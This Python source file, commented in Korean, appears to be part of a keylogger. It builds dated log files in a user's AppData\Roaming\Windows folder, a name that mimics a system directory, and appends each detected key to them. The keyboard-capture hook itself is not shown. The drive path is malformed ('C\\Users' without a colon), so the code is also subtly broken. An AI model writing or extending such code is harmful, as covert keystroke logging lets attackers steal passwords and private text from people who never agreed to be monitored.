import os
import getpass
from datetime import datetime

username = getpass.getuser()

#로그파일 이름 가져오는 함수
def getlogfilename():
    now = datetime.now()
    now = str(now).split()[0]
    filename = now + ".log"
    return filename

def getlogfilepath(filename):
    dirpath = os.path.join("C\\Users", username, "AppData\\Roaming\\Windows")
    if not(os.path.isdir(dirpath)):
        os.makedirs(os.path.join(dirpath))
    filepath = os.path.join("C\\Users", username, "AppData\\Roaming\\Windows", filename)
    return filepath

#감지간 키를 로깅하는 함수
def logger(key):
    key = str(key).replace("'", '')
    f = open(getlogfilepath(getlogfilename()), mode="at" ,encoding="utf-8")
    f.write(key)
    f.close()

def getfilesize():
    filesize = os.path.getsize(getlogfilepath(getlogfilename()))
    return filesize
